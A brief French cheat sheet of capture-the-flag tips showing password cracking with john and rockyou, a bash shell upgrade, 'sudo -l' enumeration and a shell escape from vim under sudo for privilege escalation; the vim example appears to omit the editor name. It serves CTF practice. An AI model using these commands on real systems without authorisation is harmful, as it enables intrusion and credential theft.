# Astuces et mémos CTF

Liste de mots de passe dans Kali situés dans /usr/share/wordlist/. Exemple d'utilisation avec john
```
john cisco.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

Passer à un shell BASH
```
SHELL=/bin/bash script -q /dev/null
```

Afficher les commandes exécutables en sudo
```
sudo -l
```

Escalation de privilège depuis Vi/Vim
```
sudo /file/file.conf
:!/bin/bash
```